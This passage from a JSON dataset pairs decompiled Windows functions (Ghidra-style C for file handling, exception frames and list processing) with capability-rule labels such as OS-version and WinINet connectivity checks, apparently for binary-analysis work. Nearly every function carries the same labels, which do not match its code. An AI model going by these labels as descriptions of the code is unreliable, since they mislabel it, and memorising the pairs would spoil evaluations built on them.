        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041bbfc(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa8;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (in_DL != '\\0') {\n        puStack72 = 0x41bc1f;\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    uStack76 = 0x41bd44;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1h._0_1_ = in_DL;\n    if (arg_ch == -1) {\n        in_stack_ffffffa8 = 0x80;\n        puStack72 = &fcn.0041bbfc::var_1h + 1;\n        uVar1 = fcn.004059dc(0xc0000000, 0, 0, 2, 0x80, 0);\n        sub.kernel32.dll_CreateFileA_1(uVar1);\n        fcn.0041baf4();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040a6fc();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040d2d8();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            fcn.0040dbe4(1, &fcn.0041bbfc::var_14h);\n            fcn.00404ec4();\n        }\n    }\n    else {\n        puStack72 = &fcn.0041bbfc::var_1h + 1;\n        fcn.0040a15c();\n        fcn.0041baf4();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040a6fc();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040d2d8();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            in_stack_ffffffa8 = 1;\n            fcn.0040dbe4(1, &fcn.0041bbfc::var_14h);\n            fcn.00404ec4();\n        }\n    }\n    fcn.00405584();\n    *in_FS_OFFSET = in_stack_ffffffa8;\n    uStack80 = 0x41bd4b;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 726
    },
    "0041c1b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c1b4(int32_t arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack28 = 0x41c246;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (*(arg_8h + 8) == '\\0') {\n        fcn.00405728();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        fcn.00409d60();\n    }\n    var_ch = var_4h;\n    var_8h._0_1_ = 0xb;\n    arg_ch = &var_ch;\n    arg_8h_00 = 0;\n    fcn.00407550();\n    fcn.0040db28(arg_8h_00, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack32 = 0x41c24d;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 337
    },
    "0041c4ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0041c4ac(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    \n    for (pcVar2 = *(in_EAX + 0x14); (*pcVar2 != '\\0' && (*pcVar2 != '.')); pcVar2 = pcVar2 + 1) {\n    }\n    cVar1 = *pcVar2;\n    if (cVar1 != '\\0') {\n        fcn.00405620();\n        fcn.00405a84();\n    }\n    return cVar1 != '\\0';\n}\n",
        "token_count": 132
    },
    "0041c588": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c588(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41c631;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (param_2 != NULL) {\n        while (*param_2 != '\\0') {\n            for (; (*param_2 != '\\0' && (1 < *param_2 - 0x2dU)); param_2 = param_2 + 1) {\n            }\n            fcn.00405620();\n            iVar2 = fcn.00420464();\n            if ((iVar2 == 0) && (cVar1 = fcn.00409a74(),  cVar1 != '\\0')) {\n                iVar2 = in_EAX;\n            }\n            if (iVar2 == 0) break;\n            if (*param_2 == '.') {\n                param_2 = param_2 + 1;\n            }\n            if (*param_2 == '-') {\n                param_2 = param_2 + 1;\n            }\n            in_EAX = iVar2;\n            if (*param_2 == '>') {\n                param_2 = param_2 + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41c638;\n    uStack36 = 0x41c630;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 396
    },
    "0041c6d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c6d4(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x41c6e7;\n    (**(**0x4979b0 + 0x14))();\n    uStack40 = 0x41c890;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41c6ff;\n    puStack36 = &stack0xfffffffc;\n    iVar1 = fcn.00419bf8();\n    uStack52 = 0x41c871;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (*(iVar1 + 8) < 1) {\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41c878;\n        uStack52 = 0x41c870;\n        fcn.00419c5c();\n        return;\n    }\n    puStack60 = 0x41c725;\n    puStack48 = &stack0xfffffffc;\n    fcn.00404620();\n    uStack64 = 0x41c852;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41c742;\n    puStack60 = &stack0xfffffffc;\n    fcn.00404620();\n    uStack76 = 0x41c800;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    iVar5 = 0;\n    puStack72 = &stack0xfffffffc;\ncode_r0x0041c7e1:\n    while( true ) {\n        if (*(iVar1 + 8) <= iVar5) {\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41c807;\n            uStack76 = 0x41c7ff;\n            fcn.00404650();\n            return;\n        }\n        puVar2 = fcn.00419888();\n        iVar3 = fcn.004193d4();\n        if (iVar3 != 0) break;\n        iVar4 = fcn.00416604();\n        if (iVar4 != 0) break;\n        fcn.0041c68c(&stack0xfffffffc);\n        iVar5 = iVar5 + 1;\n    }\n    if (iVar3 != 0) {\n        if ((*(iVar3 + 0x1c) & 2) != 0) {\n            fcn.0041c68c(&stack0xfffffffc);\n            iVar5 = iVar5 + 1;\n            goto code_r0x0041c7e1;\n        }\n        fcn.0041c588();\n        (***puVar2)();\n    }\n    fcn.0041c654(&stack0xfffffffc);\n    fcn.0041977c();\n    fcn.00404650();\n    goto code_r0x0041c7e1;\n}\n",
        "token_count": 805
    },
    "0041c8a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c8a0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x4979cc == 0) {\n        return;\n    }\n    puStack28 = 0x41c8c6;\n    iVar2 = fcn.00419bf8();\n    uStack32 = 0x41c93b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(iVar2 + 8) + -1;\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            iVar3 = fcn.00419888();\n            if ((in_EAX == 0) || (*(iVar3 + 8) == in_EAX)) {\n                if (param_2 != 0) {\n                    cVar1 = fcn.00409a74();\n                    if (cVar1 == '\\0') goto code_r0x0041c91d;\n                }\n                fcn.0041977c();\n                fcn.00404650();\n            }\ncode_r0x0041c91d:\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41c942;\n    uStack32 = 0x41c93a;\n    fcn.00419c5c();\n    return;\n}\n",
        "token_count": 394
    },
    "0041c94c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c94c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    if (*0x4979cc != 0) {\n        puStack24 = 0x41c969;\n        iVar1 = fcn.00419bf8();\n        uStack28 = 0x41c9c3;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack24 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.00419888();\n                if (*(iVar2 + 4) == in_EAX) {\n                    fcn.0041977c();\n                    fcn.00404650();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41c9ca;\n        uStack28 = 0x41c9c2;\n        fcn.00419c5c();\n        return;\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "0041ca98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ca98(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00409a74();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        (*arg_10h)();\n        fcn.00405530();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0041cad4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cad4(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x41caf0;\n    cVar1 = fcn.00409a74();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        puStack24 = 0x41cb0b;\n        cVar1 = fcn.0041eb40();\n        if (cVar1 != '\\n') {\n            *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n            puStack24 = 0x41cb1d;\n            fcn.0041ec50();\n            *(in_EAX + 0x88) = 1;\n            puStack24 = 0x41cb2c;\n            fcn.0041c9e8();\n        }\n        puStack24 = 0x41cb38;\n        piVar2 = fcn.00404620();\n        uStack28 = 0x41cb9e;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0041cfd8();\n        (**(*piVar2 + 4))();\n        fcn.0041cfd8();\n        *(in_EAX + 0x88) = 1;\n        (*arg_10h)();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41cba5;\n        uStack28 = 0x41cb9d;\n        fcn.00404650();\n        return;\n    }\n    return;\n}\n",
        "token_count": 459
    },
    "0041cbf4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cbf4(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_EDX;\n    uint var_10ch;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EDX;\n    if (*(in_EAX + 0x42) == 0) {\n        var_9h = '\\x01';\n    }\n    else {\n        fcn.004057e8();\n        iVar1 = fcn.004048d4();\n        *arg_8h = iVar1;\n        arg_8h[1] = var_4h;\n        var_9h = *arg_8h == 0;\n        (*in_EAX[0x10])(&var_9h, arg_8h);\n    }\n    if (var_9h != '\\0') {\n        arg_8h[1] = var_4h;\n        iVar1 = (**(*in_EAX + 0x1c))();\n        *arg_8h = iVar1;\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "0041cce4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041cce4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x41ccf6;\n    iVar1 = fcn.00419bf8();\n    uStack24 = 0x41cd54;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00419888();\n            if ((*(iVar2 + 4) == *(in_EAX + 4)) && (*(iVar2 + 0xc) == *(in_EAX + 0xc))) {\n                fcn.00404650();\n                fcn.0041977c();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41cd5b;\n    uStack24 = 0x41cd53;\n    fcn.00419c5c();\n    return;\n}\n",
        "token_count": 299
    },
    "0041cd60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041cd60(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x41ce96;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar1 = in_EAX[0xc];\n    if (iVar1 != 0) {\n        uStack52 = 0x41ce79;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        var_10h = *(iVar1 + 8);\n        puVar2 = &stack0xfffffffc;\n        var_8h = in_EAX;\n        if (-1 < var_10h + -1) {\n            do {\n                puStack36 = puVar2;\n                puVar4 = fcn.00419888();\n                fcn.004055c8();\n                (**(*var_8h + 0x24))();\n                var_ch = fcn.0041c588();\n                if ((var_ch == 0) && (*(var_8h + 0x7a) != 0)) {\n                    (*var_8h[0x1e])(&fcn.0041cd60::var_ch);\n                }\n                fcn.00419888();\n                fcn.0041cce4();\n                if ((var_ch == 0) && (cVar3 = fcn.0041c4ac(),  cVar3 != '\\0')) {\n                    fcn.00419888();\n                    fcn.00419b70();\n                    fcn.0041997c();\n                }\n                else {\n                    (***puVar4)();\n                }\n                var_10h = var_10h + -1;\n                puVar2 = puStack36;\n            } while (var_10h != 0);\n        }\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41ce80;\n        uStack52 = 0x41ce78;\n        fcn.0041cec8();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41ce9d;\n    uStack40 = 0x41ce95;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 630
    },
    "0041d2b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nvoid __cdecl fcn.0041d2b4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    char in_DL;\n    int32_t iVar3;\n    uint var_3h;\n    \n    iVar2 = fcn.0040676c();\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        do {\n            if (in_DL == '\\0') {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = ~in_AX & *(iVar1 + 0x1c);\n            }\n            else {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = *(iVar1 + 0x1c) | in_AX;\n            }\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "0041d39c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d39c(int32_t arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41d482;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41d3c1;\n    iVar2 = fcn.0041efe8();\n    *(arg_8h + -0x14) = 0;\n    if (*(*(arg_8h + -8) + 0x72) != 0) {\n        puStack32 = arg_8h + -0x14;\n        uStack36 = 0x41d3f3;\n        (**(*(arg_8h + -8) + 0x70))();\n    }\n    if (*(arg_8h + -0x14) == 0) {\n        puStack32 = 0x41d401;\n        uVar3 = (**(iVar2 + -0xc))();\n        *(arg_8h + -0x14) = uVar3;\n        if ((*(arg_8h + -9) & 4) != 0) {\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 1;\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 0x200;\n        }\n        uStack36 = 0x41d456;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        (**(**(arg_8h + -0x14) + 0x2c))();\n        *in_FS_OFFSET = uStack40;\n    }\n    puVar1 = *(arg_8h + -0x14) + 0x1c;\n    *puVar1 = *puVar1 | 1;\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 541
    },
    "0041d830": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041d830(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) == 0) {\n        puStack16 = 0x41d84f;\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x30) = uVar1;\n        uStack20 = 0x41d88b;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        fcn.0041d8a0();\n        fcn.0041cd60();\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41d89c;\n        uStack20 = 0x41d88a;\n        fcn.0041cec8();\n        return;\n    }\n    puStack16 = 0x41d89c;\n    fcn.0041d8a0();\n    return;\n}\n",
        "token_count": 263
    },
    "0041dcc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041dcc0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    int32_t var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    puStack304 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack308 = 0x41ddb1;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack312;\n    fcn.00405530();\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        fcn.004055c8();\n    }\n    if (var_4h == 0) {\n        fcn.00404530();\n        fcn.00405794();\n    }\n    var_124h = var_4h;\n    var_120h._0_1_ = 0xb;\n    var_11ch = **0x492444;\n    var_118h._0_1_ = 0xb;\n    var_114h = *(arg_8h + -8);\n    var_110h._0_1_ = 0xb;\n    var_10ch = *(in_EAX + 4);\n    var_108h._0_1_ = 0xb;\n    uVar2 = 3;\n    fcn.0040dbe4(3, &var_124h);\n    fcn.00404ec4();\n    *in_FS_OFFSET = uVar2;\n    uStack312 = 0x41ddb8;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 456
    },
    "0041e1d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.0041e1d8(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    unkbyte10 Var4;\n    ulong uVar5;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 5;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x41e4e4;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0041e1d8::var_1ch;\n    puVar1 = &stack0xfffffffc;\n    if (*0x8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**_pe_dos_header == '\\a') {\n            fcn.00416604();\n            cVar2 = fcn.004047dc();\n            puVar1 = var_14h;\n            if ((cVar2 != '\\0') && (iVar3 = fcn.00416604(),  puVar1 = var_14h,  (*(iVar3 + 0x24) & 4) != 0))\n            goto code_r0x0041e24d;\n        }\n        var_14h = puVar1;\n        fcn.0041c9d0();\n        puVar1 = var_14h;\n    }\ncode_r0x0041e24d:\n    var_14h = puVar1;\n    // switch table (17 cases) at 0x41e267\n    switch(**_pe_dos_header) {\n    case '\\x01':\n        cVar2 = fcn.0041cfb4();\n        if (cVar2 == '\\a') {\n            fcn.0041dac4();\n            fcn.0041e034();\n        }\n        else {\n            fcn.0041dbc0();\n            fcn.00416678();\n        }\n        break;\n    case '\\x02':\n        fcn.0041d074();\n        fcn.00416678();\n        break;\n    case '\\x03':\n        fcn.0041dac4();\n        fcn.00416530();\n        fcn.00416678();\n        break;\n    case '\\x04':\n        Var4 = fcn.0041d970();\n        var_28h = Var4;\n        var_24h = Var4 >> 0x20;\n        fcn.004169b0(var_28h, var_24h, CONCAT22(0x41, Var4 >> 0x40));\n        break;\n    case '\\x05':\n    case '\\n':\n        fcn.0041e9a0();\n        fcn.004168a8();\n        break;\n    case '\\x06':\n        fcn.0041e884();\n        fcn.00416678();\n        break;\n    case '\\a':\n        cVar2 = fcn.0041cfb4();\n        if (cVar2 == '\\r') {\n            fcn.0041eb40();\n            fcn.00416678();\n        }\n        else if (cVar2 == '\\x0e') {\n            fcn.0041eb40();\n            fcn.00416604();\n            fcn.0041d130();\n        }\n        else {\n            fcn.0041dac4();\n            var_24h = 0x41e42b;\n            fcn.0041e07c(&stack0xfffffffc);\n        }\n        break;\n    case '\\b':\n        cVar2 = fcn.0041cfb4();\n        if (cVar2 == '\\r') {\n            fcn.0041eb40();\n            fcn.00416bfc();\n        }\n        else {\n            fcn.0041dac4(0xe8);\n            var_24h = 0x41e477;\n            (**(*in_EAX + 0x18))();\n            if (var_14h != NULL) {\n                fcn.00416bfc();\n            }\n        }\n        break;\n    case '\\t':\n        fcn.0041d0d4();\n        fcn.00416678();\n        break;\n    case '\\v':\n        fcn.0041ea5c();\n        fcn.004168d8();\n        break;\n    case '\\f':\n        var_24h = 0x41e493;\n        fcn.0041e0bc(&stack0xfffffffc);\n        break;\n    case '\\x0f':\n        var_24h = 0x41e4b3;\n        fcn.0041e118(&stack0xfffffffc);\n        break;\n    case '\\x10':\n        uVar5 = fcn.0041dc2c();\n        var_24h = uVar5;\n        fcn.00416c34(var_24h, uVar5 >> 0x20);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x41e4eb;\n    fcn.00405554();\n    fcn.00405d28();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1255
    },
    "0041e550": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
